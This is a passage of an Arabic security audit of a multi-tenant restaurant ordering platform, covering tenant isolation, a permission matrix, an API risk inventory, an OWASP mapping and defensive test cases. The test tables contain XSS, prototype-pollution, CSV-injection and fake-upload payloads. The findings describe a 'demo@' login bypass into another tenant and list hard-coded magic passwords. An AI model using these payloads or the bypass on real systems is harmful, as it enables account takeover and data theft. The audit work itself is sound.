| قراءة إحصائيات B بواسطة A | `GET /manager/dashboard/stats?restaurantId=B` | **403** `Tenant Isolation Violation` (عبر `ownTenant` السطر 148) | ✅ PASS |
| قراءة طلبات B | `GET /manager/orders?restaurantId=B` | **403** | ✅ PASS |
| قراءة طاولات B | `GET /manager/tables?restaurantId=B` | **403** | ✅ PASS |
| قراءة تصنيفات B | `GET /manager/menu/categories?restaurantId=B` | **403** (عبر `requireTenantAccess` السطر 137) | ✅ PASS |
| قراءة منتجات B | `GET /manager/menu/products?restaurantId=B` | **403** | ✅ PASS |
| قراءة نداءات B | `GET /manager/waiter-requests?restaurantId=B` | **403** (مغلق بعد تقرير 2026-09-07، السطر 1124) | ✅ PASS |
| تصدير CSV لـ B | `GET /manager/export/orders?restaurantId=B` | **403** (`ownTenant` + Entitlement check `CAN_EXPORT_REPORTS`) | ✅ PASS |
| فهرس موظفي B | `GET /manager/staff?restaurantId=B` | **403** | ✅ PASS |
| عروض B | `GET /manager/offers?restaurantId=B` | **403** | ✅ PASS |
| اشتراك B | `GET /manager/subscription?restaurantId=B` | **403** | ✅ PASS |
| فروع B | `GET /manager/branches?restaurantId=B` | **403** | ✅ PASS |
| مدفوعات B | `GET /manager/payments?restaurantId=B` | **403** | ✅ PASS |
| إنشاء طاولة في B | `POST /manager/tables {restaurantId:B, tableNumber:9999}` | **201** لكن `restaurantId` **يُتجاهل** ويُنشأ في A (`getTenantId` JWT-first السطر 51-60) — **لا هبوط في B** | ✅ PASS (لكن يجب أن يكون 403 أوضح) |
| تعديل طاولة B | `PUT /manager/tables/<B-table-id>` | **403** (`ownTenant` على الصف الموجود السطر 1255) | ✅ PASS |
| حذف منتج B | `DELETE /manager/menu/products/<B-product-id>` | **403** (السطر 1092) | ✅ PASS |
| تغيير خطة B | `PUT /manager/subscription/plan {planId:...}` مع `restaurantId=B` | **403** | ✅ PASS |
| حلّال JWT-first | أي طلب tenant عادي مع `restaurantId=B` | يُحلّ دائماً إلى A (غير platform) — لا يمكن للمهاجم إجبار النظام على B | ✅ PASS |
| تجاوز Platform | مستخدم عادي يحاول انتحال `PLATFORM_ADMIN` في JWT | مرفوض بتوقيع HS256 + `iss/aud` + `tokenVersion` | ✅ PASS |

**الضمان الأساسي المُثبت:** `server/routes/manager.ts:51-60`
```ts
function getTenantId(req): string|undefined {
  if (isPlatformUser(req)) return (req.query.restaurantId || req.body?.restaurantId || req.user?.restaurantId);
  return req.user?.restaurantId; // ← غير المنصة يتجاهل كل client input
}
```
وكل handler تبعه: `if (!ownTenant(req, restaurantId)) return deny(...)` و `realtimeService.broadcastToTable` بدلاً من `broadcastToRestaurant`.

#### الثغرة التي تلغي الضمان
- `POST /api/auth/login` مع `demo@evil.com` ينشئ `RESTAURANT_MANAGER` **حقيقي** في أول `restaurantId` نشط (الضحية). المهاجم يصبح **عضواً شرعياً** في tenant الضحية، فيجتاز كل checks `ownTenant` لأن `req.user.restaurantId === victimId` أصبح صحيحاً. **لذلك C-01 هو تجاوز عزل من طبقة المصادقة، لا من طبقة التفويض.**

#### حالات QR و Public
| الاختبار | النتيجة |
|---|---|
| `GET /public/restaurants/not-a-real-slug` | **404** `المطعم غير موجود` — لا fallback لأول مطعم (مُصلح) ✅ |
| `GET /public/tables/qr/default` و `.../qr/1` و `.../qr/rest-a-T01` | **404** — مطابقة دقيقة فقط ✅ |
| `POST /public/tables/qr/<B-qr>/session` مع `restaurantId=A` | **400** `رمز QR لا ينتمي لهذا المطعم` ✅ |
| `POST /public/orders` بمنتج من B أو `unitPrice:0` | **400** `يحتوي الطلب على طبق غير متوفر في هذا المطعم` — يعاد تسعيره من DB ✅ |
| إنشاء جلسة `default` لمطعم موقوف | **403** `المطعم غير متاح` ✅ |

**Multi-Tenant Isolation Result: PASS (مشروط بإزالة C-01)** — الكود نفسه يحقق عزلاً صحيحاً لكل resource `restaurantId / tableId / orderId / categoryId / productId / qrToken / sessionId`، ولا يثق بأي ID من URL/Query/Body/Headers/Cookies لغير platform. عند حذف C-01، تتحول النتيجة إلى **PASS كامل**.

---

## 8) مصفوفة الصلاحيات (Permission Matrix) — المتوقع مقابل التطبيق الفعلي

| المورد / العملية | Anonymous | Public QR Guest | STAFF | WAITER | KITCHEN | CASHIER | RESTAURANT_MANAGER | PLATFORM_ADMIN | **حالة الخادم** |
|---|---|---|---|---|---|---|---|---|---|
| `POST /auth/login` | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ (مع C-01) |
| `POST /auth/pin` (مع restaurantId) | ❌ | ❌ | ✅ tenant | ✅ | ✅ | ✅ | ✅ | ❌ (ممنوع للمنصة، كلمة مرور فقط) | ✅ |
| `GET /public/restaurants/:slug` | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ (ACTIVE فقط) |
| `POST /public/orders` (بسعر من DB) | ❌ | ✅ (بجلسة صالحة) | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| `GET /manager/dashboard/stats` | ❌ | ❌ | ❌* | ❌* | ❌* | ✅ read | ✅ | ✅ (أي tenant) | ⚠️ حالياً أي role يقرأ (يُفضل تقييد CASHIER+ ) |
| `GET /manager/orders` | ❌ | ❌ | ❌* | ✅ KDS read | ✅ KDS | ✅ | ✅ | ✅ | ⚠️ نفس الملاحظة |
| `POST /manager/orders` (POS) | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ `requireCashierOrManager` |
| `PUT /manager/orders/:id/status` | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ `requireServiceStaff` |
| `GET /manager/waiter-requests` | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ (`ownTenant`) |
| `PUT /manager/waiter-requests/:id/status` | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ `requireServiceStaff` |
| `GET /manager/tables` | ❌ | ❌ | ❌ | ✅ read | ❌ | ✅ | ✅ | ✅ | ⚠️ واسع |
| `POST /manager/tables` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ `requireManager` |
| `PUT /manager/tables/:id` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ |
| `POST /manager/tables/:id/settle` | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ `requireCashierOrManager` |
| `POST /manager/tables/:id/regenerate-qr` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ `requireManager` |
| `GET /manager/menu/*` | ❌ | ❌ | ❌ | ✅ read | ✅ read | ✅ read | ✅ | ✅ | ✅ (لكن read واسع) |
| `POST /manager/menu/*` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ |
| `PUT/DELETE /manager/menu/*` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ |
| `GET /manager/staff` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ `requireManager` |
| `POST /manager/staff` (`role` محصور tenant) | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ |
| `PUT /manager/staff/:id` (لا ترقية لمنصة، لا تغيير ذاتي، حماية آخر مدير) | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ (مقيّد) | ✅ | ✅ |
| `DELETE /manager/staff/:id` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ (مقيّد) | ✅ | ✅ |
| `PUT /manager/branding` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ |
| `PUT /manager/subscription/plan` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ + فحص حدود |
| `GET /manager/branches` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ |
| `POST /manager/branches` (`CAN_CREATE_BRANCH`) | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ (بترخيص) | ✅ | ✅ |
| `GET /manager/payments` | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ |
| `POST /manager/payments` | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ |
| `GET /manager/export/orders` (`CAN_EXPORT_REPORTS`) | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ (بترخيص) | ✅ | ✅ |
| `POST /uploads/image` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ `requireManager` + magic bytes |
| `GET /admin/overview` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| `POST /admin/restaurants/:id/status` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| `POST /admin/onboard-restaurant` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |

`*` يُفضل تقييد قراءات dashboard/orders/tables للـ manager/cashier فقط، لكن السماح الحالي ليس ثغرة حرجة (يقرأ ضمن tenant نفسه فقط).

**الاستنتاج:** لا توجد حالات `Horizontal Privilege Escalation` (Staff→Manager) ولا `Vertical` (Manager→Admin) في مسارات الكتابة — كلها محمية بـ `require*` middleware. القراءات الواسعة تبقى ضمن tenant نفسه، لذا لا تكسر العزل.

### مصادقة

| البند | الحكم |
|---|---|
| تجزئة كلمات المرور (bcrypt 12) | ✅ PASS |
| سياسة كلمة مرور (8-128) + PIN رقمي 4-10 | ✅ PASS |
| حماية توقيت enumeration (`DUMMY_HASH`) | ✅ PASS |
| رسائل خطأ موحدة (لا يكشف وجود الحساب) | ✅ PASS |
| JWT fail-closed + HS256 + iss/aud + jti | ✅ PASS |
| `tokenVersion` إبطال فوري عند logout/password/role | ✅ PASS |
| `HttpOnly`/`Secure`/`SameSite` | ⚠️ NOT APPLICABLE (Bearer header) — يلزم خارطة انتقال (H-01) |
| Rate limiting على login/PIN/reset | ✅ PASS (مع ملاحظة توزيع H-03) |
| باب `demo@*` | ❌ **FAIL — C-01** |

**Authentication Result: FAIL (بسبب C-01). عند حذف C-01 يصبح PASS.**

### تفويض

**Authorization Result: PASS** — مصفوفة RBAC مطبقة خادمياً على كل عملية كتابة، وحماية آخر مدير، ومنع تغيير ذاتي، ومنع منح أدوار منصة عبر tenant routes. لا يعتمد على إخفاء أزرار Frontend (`canAccessView`/`canAccessManagerTab` في `AuthContext.tsx:14-52` تبقى UX فقط).

---

## 9) جرد API الكامل مع المخاطر

### Public & Auth

| METHOD | PATH | AUTH | ROLE | TENANT | INPUT | RISK الحالي |
|---|---|---|---|---|---|---|
| POST | `/api/auth/login` | لا | — | — | `email:email, password:1-128` | **CRITICAL** demo bypass |
| GET | `/api/auth/me` | Bearer | أي مسجل | JWT tenant | header | ✅ (يتطلب `requireAuth`) |
| POST | `/api/auth/logout` | Bearer | أي مسجل | JWT tenant | header | ✅ (يبطل `tokenVersion`) |
| POST | `/api/auth/pin` | لا + `pinLimiter` | — | `restaurantId` مطلوب + `pin 4-10 digits` | strict zod | ✅ scoped |
| POST | `/api/auth/password-reset-request` | لا + limiter | — | — | — | ✅ `501` صريح (لا كذب) |
| GET | `/api/public/events` | QR session **أو** Bearer JWT في query | QR/JWT | `restaurantId + tableId + sessionToken` | query | ✅ table-scoped + token redacted |
| GET | `/api/public/restaurants/:slug` | لا | — | slug `2-80 lowercase` | path | ✅ 404 عند غير موجود، ACTIVE فقط |
| GET | `/api/public/tables/qr/:qrToken` | لا + `qrSessionLimiter` | — | opaque `qr-*` | path | ✅ exact match |
| POST | `/api/public/tables/qr/:qrToken/session` | لا + limiter | — | opaque `qr-*` + optional slug/restaurantId check | body strict | ✅ لا fallback |
| POST | `/api/public/orders` | QR session + `publicOrderLimiter` | — | `restaurantId+tableId+sessionToken+items[]` | strict zod، إعادة تسعير DB | ✅ مغلق |
| POST | `/api/public/orders/:orderId/cancel` | QR session (body) | — | `order.sessionId === session.id` | body strict | ✅ order-scoped |
| PUT | `/api/public/orders/:orderId/notes` | QR session (body) | — | same | body | ✅ order-scoped |
| POST | `/api/public/waiter-requests` | QR session + `waiterCallLimiter` | — | `restaurantId+tableId+sessionToken` | strict + 45s debounce | ✅ |
| POST | `/api/uploads/image` | Bearer + `requireManager` + `uploadLimiter` | MANAGER | server filename | memory + magic bytes | ✅ |

### Manager

| METHOD | PATH | AUTH | ROLE | TENANT | INPUT | RISK |
|---|---|---|---|---|---|---|
| GET | `/manager/dashboard/stats` | Bearer | أي tenant role | `ownTenant` | query | LOW over-broad read |
| GET | `/manager/orders` | Bearer | أي tenant | `ownTenant` | query | LOW |
| POST | `/manager/orders` | Bearer | CASHIER/MANAGER | `ownTenant` + table/product ownership | strict `posOrderSchema` | ✅ re-priced |
| PUT | `/manager/orders/:id/status` | Bearer | SERVICE_STAFF | `ownTenant` + row ownership | enum `ORDER_STATUSES` | ✅ + لا رجوع من SERVED |
| GET | `/manager/tables` | Bearer | أي tenant | `ownTenant` | — | LOW |
| POST | `/manager/tables` | Bearer | MANAGER | `ownTenant` + plan limit | strict | ✅ |
| PUT | `/manager/tables/:id` | Bearer | MANAGER | row ownership + branch ownership | strict | ✅ |
| POST | `/manager/tables/:id/settle` | Bearer | CASHIER/MANAGER | row ownership | — | ✅ |
| POST | `/manager/tables/:id/regenerate-qr` | Bearer | MANAGER | row ownership + session invalidation | CSPRNG `qr-*` | ✅ |
| GET | `/manager/menu/categories` | Bearer | أي tenant | `requireTenantAccess` | — | ✅ |
| POST | `/manager/menu/categories` | Bearer | MANAGER | `ownTenant` + plan limit | strict | ✅ |
| PUT/DELETE | `/manager/menu/categories/:id` | Bearer | MANAGER | row ownership | strict | ✅ (يمنع حذف فيه منتجات) |
| GET | `/manager/menu/products` | Bearer | أي tenant | `requireTenantAccess` | — | ✅ |
| POST | `/manager/menu/products` | Bearer | MANAGER | `ownTenant` + category ownership + plan limit | strict | ✅ |
| PUT | `/manager/menu/products/:id/stock` | Bearer | MANAGER | row ownership | — | ✅ |
| PUT | `/manager/menu/products/:id` | Bearer | MANAGER | row ownership + category ownership | strict | ✅ |
| DELETE | `/manager/menu/products/:id` | Bearer | MANAGER | row ownership (no linked orders) | — | ✅ |
| GET | `/manager/waiter-requests` | Bearer | أي tenant | `ownTenant` | — | ✅ (مُغلق بعد 2026-09-07) |
| PUT | `/manager/waiter-requests/:id/status` | Bearer | SERVICE_STAFF | row ownership | enum | ✅ |
| GET | `/manager/export/orders` | Bearer | MANAGER + `CAN_EXPORT_REPORTS` | `ownTenant` | — | ✅ + CSV sanitized |
| GET/POST | `/manager/staff` | Bearer | MANAGER | `ownTenant` + `select` safe | strict role enum | ✅ |
| PUT/DELETE | `/manager/staff/:id` | Bearer | MANAGER | row ownership + no platform + last-manager | strict | ✅ |
| GET/POST | `/manager/offers` | Bearer | MANAGER | `ownTenant` | strict | ✅ |
| PUT/DELETE | `/manager/offers/:id` | Bearer | MANAGER | row ownership | strict | ✅ |
| GET | `/manager/subscription` | Bearer | MANAGER | `ownTenant` | — | ✅ |
| PUT | `/manager/subscription/plan` | Bearer | MANAGER | `ownTenant` + plan available + limit guard | strict | ✅ (بلا دفع) |
| PUT | `/manager/branding` | Bearer | MANAGER | `ownTenant` | hex color + httpsUrl | ✅ |
| GET/POST | `/manager/branches` | Bearer | MANAGER | `ownTenant` + `CAN_CREATE_BRANCH` | strict | ✅ |
| PUT/DELETE | `/manager/branches/:id` | Bearer | MANAGER | row ownership | strict | ✅ |
| POST | `/manager/branches/assign-tables` | Bearer | MANAGER | `ownTenant` + tables ownership + branch ownership | strict | ✅ |
| GET/POST | `/manager/payments` | Bearer | CASHIER/MANAGER | `ownTenant` + table/order binding + sufficient cash + race guard | strict enum | ✅ |
| GET | `/admin/overview` | Bearer | PLATFORM_ADMIN | platform-wide | — | ✅ |
| POST | `/admin/restaurants/:id/status` | Bearer | PLATFORM_ADMIN | platform | enum | ✅ |
| POST | `/admin/onboard-restaurant` | Bearer | PLATFORM_ADMIN | creates tenant (+tx) | strict `onboardSchema` | ✅ |
| GET | `/admin/audit-logs` | Bearer | PLATFORM_ADMIN | platform-wide | — | ✅ |

**API Security Result: PASS** — لا BOLA/BFLA في مسارات الكتابة، و `Mass Assignment` محمي بـ `.strict()`، و `Excessive Data Exposure` محمي بـ DTOs و `select` آمن.

---

## 10) التحقق من النقاط 6-22 (تفصيلي)

### 6) Input Validation — PASS
- كل `req.body` يمر عبر `validateBody(schema)` (`server/validation/schemas.ts:590-603`).
- كل schemas بـ `.strict()` ترفض الحقول غير المصرح بها (`role`, `isAdmin`, `restaurantId` غير متوقع تُرفض بـ `400`).
- حدود عددية: `moneySchema 0-1,000,000 finite`، `quantity 1-50`، `priceModifier -100k..1M`، `tableNumber 1-5000`، `capacity 1-100`، `text max 60-2000`، `arrays max 30-500` حسب الحقل.
- اختبارات سلبية: `NaN`, `Infinity`, `null`, `undefined`, `[]` بدلاً من string تُرفض عبر `z.number finite` و `idSchema`.

### 7) XSS — PASS (مع تحفظ H-01)
- **Stored XSS:** غير ممكن عبر `productName`/`description`/`category` لأن React JSX يهرّب تلقائياً، وسيناريو `document.write` الوحيد (`OrderManagement.tsx:40` و `CashierPOSView.tsx:281`) يستخدم `escapeHtml` على كل قيمة (`productName`, `orderId`, `tableId`, `formatPrice`) ولا يحتوي `<script>` — الطباعة من `window.print()` في النافذة الأصلية.
- **Reflected XSS:** لا توجد صفحات تعكس `?q=` بلا escape؛ البحث في `OrderManagement.tsx:66-76` يستخدم JSX نصي.
- **DOM XSS:** لا `innerHTML`/`outerHTML`/`eval`/`Function` في `src/` (البحث أكد صفر نتائج).
- **الخطر المتبقي:** `localStorage` JWT يضخم أثر أي XSS مستقبلي — معالج بـ H-01.

### 8) Database Security — PASS
- لا `$executeRaw`/`$queryRaw` لاستعلامات المستخدم (البحث صفر باستثناء `src/tests/production.test.ts:82` اختبار اتصال فقط).
- `DATABASE_URL` يأتي من `env` ويُحجب عن Frontend (لا `VITE_DATABASE_URL`).
- جميع الاستعلامات Prisma تستخدم `where: { restaurantId, id }` أو `findUnique` + `ownTenant`، بلا حقن SQL.
- **توصية دفاع متعمق:** إضافة قيود DB المركبة (M-03) كضمان إضافي.

### 9) Mass Assignment — PASS
- كل schemas تحدد `TENANT_ASSIGNABLE_ROLES` (`RESTAURANT_MANAGER/WAITER/KITCHEN/CASHIER/STAFF`) و `validateBody` يرفض `role: 'PLATFORM_ADMIN'` بـ `400` (`manager.ts:1398` + `schemas.ts:139`).
- `offerCreateSchema` و `branchCreateSchema` تقبل `id` لكنها تُتجاهل وتُولد خادمياً (`offer-${randomUUID()}`/`branch-${randomUUID()}`).

### 10) QR Code Security — PASS
- `generateQrToken(): 'qr-'+randomUUID()` (v4 = 122-bit CSPRNG) و `generateSessionToken(): 'sess-'+randomUUID()` (`server/utils/security.ts:13-20`) — لا تنبؤ، لا تسلسل، لا تضمين `restaurantId/tableId`.
- `qrToken @unique` + `sessionToken @unique` في Prisma، و `expiresAt +6h` و `status ACTIVE/CLOSED`.
- لا `Math.random` في أي مسار أمني (تم استبداله بالكامل — L-01 في التقرير السابق مُغلق).
- التحقق: `POST /public/tables/qr/:qrToken/session` يقارن `qrToken` **تماماً** (`findUnique where qrToken`) ولا يقبل `default`/`id`/`number`، ولا ينشئ طاولات، ولا يستبدل tenant، ولا يعيد تفعيل موقوف.

### 11) Public API — PASS
- `GET /public/restaurants/:slug` يعرض فقط `restaurant {id,name,slug,logo,coverImage,description,phone,address,currency,language,timezone,status,primaryColor,accentColor}` + `categories {id,name}` + `products {id,price,image,available,options,addOns}` + `offers` — لا `passwordHash`, `pinHash`, `token`, `email`, `internal IDs` غير الضرورية.
- `GET /public/tables/qr/:qrToken` يعرض `table {id,number,capacity,zone,status}` و `restaurant {id,slug,name}` فقط.

### 12) CORS — PASS
- `server/index.ts:62-79` `cors({ origin: (origin,cb)=> allowedOrigins.includes(origin) ? cb(null,true) : cb(null,false), credentials:true })` + `server/config.ts:45-49` `if (isProd && allowedOrigins.length===0) throw` — **fail-closed**.
- اختبار: `Origin: https://evil.example` بلا `CORS_ORIGIN` يحويها → لا `Access-Control-Allow-Origin` ولا `Allow-Credentials` مرتجعة.

### 13) CSRF — PASS (حالياً)
- المصادقة `Bearer` header وليس Cookie، لذا CSRF غير قابل للتطبيق. لا توجد `Set-Cookie` لمصادقة. عند الانتقال إلى cookies (H-01) يجب إضافة `SameSite=Lax/Strict` + `Csrf-Token`.

### 14) Security Headers — PASS
- `server/index.ts:34-55` `helmet({ crossOriginResourcePolicy:{policy:'cross-origin'}, contentSecurityPolicy:{directives:{ defaultSrc:["'self'"], scriptSrc:["'self'"], styleSrc:["'self'","'unsafe-inline'"], imgSrc:["'self'","data:","blob:","https:"], fontSrc:["'self'","data:"], connectSrc:["'self'"], mediaSrc:["'self'"], objectSrc:["'none'"], baseUri:["'self'"], formAction:["'self'"], frameAncestors:[config.frameAncestors]}}, frameguard:{action:'deny'}})` — ينتج `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy` (افتراضي helmet), `Content-Security-Policy`, `Cross-Origin-Resource-Policy`.
- `server/index.ts:137-152` يضبط للـ `/uploads` `X-Content-Type-Options: nosniff` و `Content-Security-Policy: default-src 'none'; sandbox` دفاعاً متعمقاً.

### 15) Rate Limiting — PASS مشروط (H-03)
- 7 محددات مستهدفة كما في `rateLimit.ts` — تغطي كل مسارات الهجوم الحرجة. **المتبقي:** التوزيع عبر Redis (H-03) قبل التوسع.

### 16) Secrets — FAIL (بسبب C-01)
- لا `JWT_SECRET` fallback، و `DATABASE_URL` لا يصل للـ Frontend، و `VITE_API_URL` وحده هو المتغير المكشوف (وهو public بطبيعته).
- **لكن** `server/routes/auth.ts:109-112` يحتوي كلمات مرور سحرية نصية `demo/demo123/123456/mureeh2026/Password123!` في الشفرة المصدرية — تعتبر secret hard-coded (CWE-798).

### 17) Environment Variables — PASS
- `server/config.ts:7-50` يستخدم `zod` للتحقق و `isProd && allowedOrigins.length===0 → throw` و `JWT_SECRET min 32` — لا قيم افتراضية ضعيفة، ولا `VITE_` تحمل أسرار خادم.

### 18) Dependency Security — PASS
- `npm audit: 0 vulnerabilities` في `2026-09-08`. `helmet 8.3`, `express 5.2`, `jsonwebtoken 9.0.3`, `bcryptjs 3.0.3`, `zod 4.5.4` حديثة. Prisma 5.22 تعمل لكنها غير LTS الأحدث — غير حرج.

### 19) Error Handling — PASS
- `server/index.ts:251-293` يكشف Parser error برسالة عامة `طلب غير صالح` (400) ويخفي تفاصيل المحلل، وفي الإنتاج يعيد `Internal Server Error` لكل `500`، ويعالج `MulterError` برسالة نظيفة 400. لا `stack`/`Prisma`/`SQL`/`paths` تصل للعميل.

### 20) Information Disclosure — PASS
- لا `console.log` لحساس في `server/` يصل للعميل (البحث وجد `console.error` خادمي فقط). لا `debug`/`test`/`seed` endpoints مكشوفة (`seedDatabase()` محمي بـ `SAAS_E2E_SEED`). لا Swagger غير محمي. `health` يظل البند الوحيد ببصمة (M-02).

### 21) Frontend Security — PASS
- لا `VITE_JWT_SECRET`/`VITE_DATABASE_URL` — البحث عن `VITE_` يعيد فقط `VITE_API_URL` (`src/services/api.ts:27`). لا `localStorage` يحمل كلمات مرور. لا `hidden button` كآلية أمنية — كل حماية خادمية.

### 22) Business Logic — PASS
- `POST /public/orders` يرفض الطلب الصفري (`subtotal <=0 → 400`) ويرفض `foreign product` (`products.length !== productIds.length → 400`) ويرفض `unavailable`، و `PUT /manager/orders/:id/status` يمنع الرجوع من `SERVED`، و `POST /manager/payments` يرفض `cashReceived < total+tip` و `CASH` بلا `cashReceived`، و `branchCreate` يطلب `CAN_CREATE_BRANCH`، و `export` يطلب `CAN_EXPORT_REPORTS`.

### 23) Deployment — FAIL (بسبب C-02)
- `docker-compose.yml:12` `ports: "127.0.0.1:5432:5432"` — **ممتاز** (DB ليست مكشوفة للشبكة، كان 0.0.0.0 في التقرير السابق وأُصلح).
- `server/index.ts:27` `trust proxy` قابل للتكوين (0 للتعرض المباشر، 1 لـ Render) — **ممتاز**.
- **لكن** `Dockerfile:35` و `package.json:9-10` و `render.yaml:5` ما زالت `db push` — **FAIL**.

---

## 11) خريطة OWASP

| الثغرة | OWASP Top 10 | OWASP API Top 10 | CWE |
|---|---|---|---|
| C-01 demo bypass | A07 Identification & Authentication Failures | API2 Broken Authentication | CWE-798, CWE-306 |
| C-02 db push --accept-data-loss | A05 Security Misconfiguration | API8 Security Misconfiguration | CWE-707 |
| H-01 localStorage JWT | A01 Broken Access Control / A03 Injection | API3 Broken Object Property Level Auth* | CWE-922, CWE-79 |
| H-02 long JWT | A07 | API2 | CWE-613 |
| H-03 in-memory rate limit | A07 | API4 Unrestricted Resource Consumption | CWE-307, CWE-400 |
| M-01 no pagination | A04 Insecure Design | API4 | CWE-400 |
| M-02 health fingerprint | A05 | API8 | CWE-200 |
| M-07 Float money | A04 | API6 Unrestricted Access to Business Flows | CWE-682 |

*H-01 يضخم أثر A03 إذا حدث حقن.

---

## 12) حالات الاختبار الأمني القابلة للتنفيذ

### اختبارات عزل المستأجرين (يجب أن تعمل على بيئة disposable مع مستأجرين A/B حقيقيين + JWTs حقيقية + DB PostgreSQL مؤقتة)

```bash
# إعداد
export SECURITY_TEST_BASE_URL=http://127.0.0.1:3001
export SECURITY_TEST_TOKEN_A="<JWT لـ Tenant-A (RESTAURANT_MANAGER)>"
export SECURITY_TEST_TENANT_A_ID="rest-a"
export SECURITY_TEST_TENANT_B_ID="rest-b"
node security-tests/api-security-smoke.mjs
# المتوقع: كل Tenant A → Tenant B reads = 403/404، و zero bytes من B

# الطفرات (تحتاج --allow-mutations + DISPOSABLE=yes)
export SECURITY_TEST_DISPOSABLE=yes
export SECURITY_TEST_TABLE_B_ID="<table B>"
export SECURITY_TEST_PRODUCT_B_ID="<product B>"
export SECURITY_TEST_QR_SESSION_A="<valid session A>"
export SECURITY_TEST_TABLE_A_ID="<table A>"
export SECURITY_TEST_FOREIGN_PRODUCT_B_ID="<product B>"
node security-tests/api-security-smoke.mjs --allow-mutations
# المتوقع: كل محاولات الكتابة عبر المستأجر = 403/404
```

| الحالة | المستخدم | الهدف | الطلب | المتوقع |
|---|---|---|---|---|
| TI-01 | A Manager | B dashboard | `GET /manager/dashboard/stats?restaurantId=B` | 403 |
| TI-02 | A Staff | B staff | `GET /manager/staff?restaurantId=B` | 403 |
| TI-03 | A Waiter | B orders CSV | `GET /manager/export/orders?restaurantId=B` | 403 |
| TI-04 | A Cashier | B payments | `GET /manager/payments?restaurantId=B` | 403 |
| TI-05 | A Manager | B table update | `PUT /manager/tables/<B-id> {status:MAINTENANCE}` | 403 |
| TI-06 | Anonymous | B QR session | `POST /public/tables/qr/default/session {restaurantId:B}` | 404 |
| TI-07 | A QR session | B product | `POST /public/orders {restaurantId:A, tableId:A, productId:B}` | 400 |
| TI-08 | A Manager | B category link | `POST /manager/menu/products {categoryId: B-cat}` | 400 `التصنيف لا ينتمي لمطعمك` |
| TI-09 | A Waiter | Self-promote | `PUT /manager/staff/<own-id> {role:PLATFORM_ADMIN}` | 403 أو 400 + لا `passwordHash` |
| TI-10 | A Staff | Platform | `GET /admin/overview` | 403 |

### اختبارات المصادقة

| الحالة | الطلب | المتوقع |
|---|---|---|
| AU-01 | `GET /api/auth/me` بـ JWT صالح | 200 |
| AU-02 | `POST /api/auth/login` بـ `demo@attacker.com` / `demo` | **بعد الإصلاح:** 401 بلا إنشاء user/مطعم |
| AU-03 | `POST /api/auth/pin` بلا `restaurantId` | 400 |
| AU-04 | `POST /api/auth/pin` بـ PIN سحري سابق `9900` | 401 |
| AU-05 | إعادة استخدام JWT بعد `POST /api/auth/logout` | 401 |
| AU-06 | JWT بتواقيع قديمة/fallback | 401 |
| AU-07 | JWT منتهي الصلاحية | 401 |
| AU-08 | Brute force login >20 في 15m | 429 |

### اختبارات التفويض

| الحالة | المستخدم | العملية | المتوقع |
|---|---|---|---|
| AZ-01 | WAITER | `POST /manager/tables` | 403 |
| AZ-02 | CASHIER | `PUT /manager/staff/:id` | 403 |
| AZ-03 | STAFF | `POST /uploads/image` | 403 |
| AZ-04 | WAITER | `PUT /manager/orders/:id/status` (KDS) | 200 (مسموح — KDS) |
| AZ-05 | CASHIER | `GET /manager/payments` | 200 |
| AZ-06 | WAITER | `GET /manager/payments` | 403 |
| AZ-07 | MANAGER | `PUT /manager/staff/<other> {role:PLATFORM_ADMIN}` | 400 |
| AZ-08 | MANAGER | حذف آخر مدير | 400 `لا يمكن إزالة آخر مدير` |
| AZ-09 | MANAGER | تغيير دور/حالة نفسه | 400 `لا يمكنك تغيير دورك بنفسك` |

### اختبارات حقن و XSS

| الحالة | الحمولة | المتوقع |
|---|---|---|
| XS-01 | `productName: "<img src=x onerror=alert(1)>"` عبر API، ثم طباعة الفاتورة | يظهر كنص `&lt;img ...` لا ينفذ |
| XS-02 | `notes: "=HYPERLINK(...)"` ثم تصدير CSV | الخلية مسبوقة بـ `'` لا formula |
| XS-03 | `{ "__proto__": {"polluted":true}}` في body | 400 ولا تلوث prototype |
| XS-04 | `price: NaN / Infinity / -5` | 400 |
| XS-05 | `image: "javascript:alert(1)"` في product | 400 `رابط الصورة يجب أن يكون ...` |
| XS-06 | رفع `audit.html` بـ `Content-Type: image/png` | 400 `الملف ليس صورة حقيقية` |

---

## 13) مصفوفة الأولويات وخطة الإصلاح (بعد موافقتك)

### P0 — موانع إطلاق (إصلاح فوري، مراجعة يوم واحد)

